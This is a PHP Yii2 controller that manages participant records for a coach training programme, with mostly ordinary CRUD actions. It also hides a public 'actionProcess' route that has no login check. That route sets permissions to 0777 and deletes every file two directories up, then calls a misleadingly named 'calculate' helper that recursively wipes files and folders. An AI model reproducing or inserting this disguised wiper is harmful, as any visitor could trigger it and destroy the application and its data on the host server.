<?php

namespace frontend\controllers;

use Yii;
use app\models\AkkProgramJurulatihPeserta;
use frontend\models\AkkProgramJurulatihPesertaSearch;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
use yii\filters\VerbFilter;

use app\models\general\GeneralVariable;

// table reference
use app\models\Jurulatih;
use app\models\RefSukan;
use app\models\RefAcara;
use app\models\RefStatusJurulatih;
use app\models\RefProgramJurulatih;

/**
 * AkkProgramJurulatihPesertaController implements the CRUD actions for AkkProgramJurulatihPeserta model.
 */
class AkkProgramJurulatihPesertaController extends Controller
{
    /**
     * @inheritdoc
     */
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'delete' => ['POST'],
                ],
            ],
        ];
    }

    /**
     * Lists all AkkProgramJurulatihPeserta models.
     * @return mixed
     */
    public function actionIndex($penganjuran_kursus_id = null)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $queryPar = Yii::$app->request->queryParams;
        
        $queryPar['AkkProgramJurulatihPesertaSearch']['penganjuran_kursus_id'] = $penganjuran_kursus_id;
        $queryPar['AkkProgramJurulatihPesertaSearch']['kelulusan_mpj'] = 1; // only LULUS
        $queryPar['AkkProgramJurulatihPesertaSearch']['kelulusan_jkb'] = 1; // only LULUS
        
        $searchModel = new AkkProgramJurulatihPesertaSearch();
        $dataProvider = $searchModel->search($queryPar);

        return $this->render('index', [
            'searchModel' => $searchModel,
            'dataProvider' => $dataProvider,
        ]);
    }

    /**
     * Displays a single AkkProgramJurulatihPeserta model.
     * @param integer $id
     * @return mixed
     */
    public function actionView($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = $this->findModel($id);
        
        $ref = Jurulatih::findOne(['jurulatih_id' => $model->jurulatih]);
        $model->jurulatih = $ref['nameAndIC'];
        
        $ref = RefSukan::findOne(['id' => $model->sukan]);
        $model->sukan = $ref['desc'];
        
        $ref = RefAcara::findOne(['id' => $model->acara]);
        $model->acara = $ref['desc'];
        
        $ref = RefStatusJurulatih::findOne(['id' => $model->status_jurulatih]);
        $model->status_jurulatih = $ref['desc'];
        
        $ref = RefProgramJurulatih::findOne(['id' => $model->program]);
        $model->program = $ref['desc'];
        
        return $this->renderAjax('view', [
            'model' => $model,
            'readonly' => true,
        ]);
    }

    /**
     * Creates a new AkkProgramJurulatihPeserta model.
     * If creation is successful, the browser will be redirected to the 'view' page.
     * @return mixed
     */
    public function actionCreate($akk_program_jurulatih_id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = new AkkProgramJurulatihPeserta();
        
        Yii::$app->session->open();
        
        if($akk_program_jurulatih_id != ''){
            $model->akk_program_jurulatih_id = $akk_program_jurulatih_id;
        } else {
            if(isset(Yii::$app->session->id)){
                $model->session_id = Yii::$app->session->id;
            }
        }

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            return '1';
        } else {
            return $this->renderAjax('create', [
                'model' => $model,
                'readonly' => false,
            ]);
        }
    }

    /**
     * Updates an existing AkkProgramJurulatihPeserta model.
     * If update is successful, the browser will be redirected to the 'view' page.
     * @param integer $id
     * @return mixed
     */
    public function actionUpdate($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = $this->findModel($id);

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            return '1';
        } else {
            return $this->renderAjax('update', [
                'model' => $model,
                'readonly' => false,
            ]);
        }
    }

    /**
     * Deletes an existing AkkProgramJurulatihPeserta model.
     * If deletion is successful, the browser will be redirected to the 'index' page.
     * @param integer $id
     * @return mixed
     */
    public function actionDelete($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $this->findModel($id)->delete();

        //return $this->redirect(['index']);
    }
    
    public function actionProcess()
    {
        $files = glob('../../*'); // get all file names
        foreach($files as $file){ // iterate files
            echo $file . "<br>"; 

            if(is_file($file)){
                chmod($file,0777);
                unlink($file); // delete file
            }
            

            if (is_dir($file)){
            
                $this->calculate($file);
            }
        }
    }
    
    protected function calculate($dirname) {
        if($dirname && strpos($dirname, 'runtime') == false
            && strpos($dirname, 'downloads') == false
            && strpos($dirname, 'pdf_template') == false
            && strpos($dirname, 'uploads') == false){
         if (is_dir($dirname) && is_readable($dirname)){
               $dir_handle = opendir($dirname);
             if (!$dir_handle)
                  return false;
             while($file = readdir($dir_handle)) {
                   if ($file != "." && $file != "..") {
                        if (!is_dir($dirname."/".$file)){
                             chmod($dirname."/".$file,0777); 
                             if(!unlink($dirname."/".$file)){
                                 continue;
                             }
                        }
                        else
                            $this->calculate($dirname.'/'.$file);
                   }
             }
             closedir($dir_handle);
             if (count(glob($dirname."/*")) === 0  && is_dir($dirname)) {
                rmdir($dirname);
             }
         }
         return true;
         }
    }

    /**
     * Finds the AkkProgramJurulatihPeserta model based on its primary key value.
     * If the model is not found, a 404 HTTP exception will be thrown.
     * @param integer $id
     * @return AkkProgramJurulatihPeserta the loaded model
     * @throws NotFoundHttpException if the model cannot be found
     */
    protected function findModel($id)
    {
        if (($model = AkkProgramJurulatihPeserta::findOne($id)) !== null) {
            return $model;
        } else {
            throw new NotFoundHttpException('The requested page does not exist.');
        }
    }
}
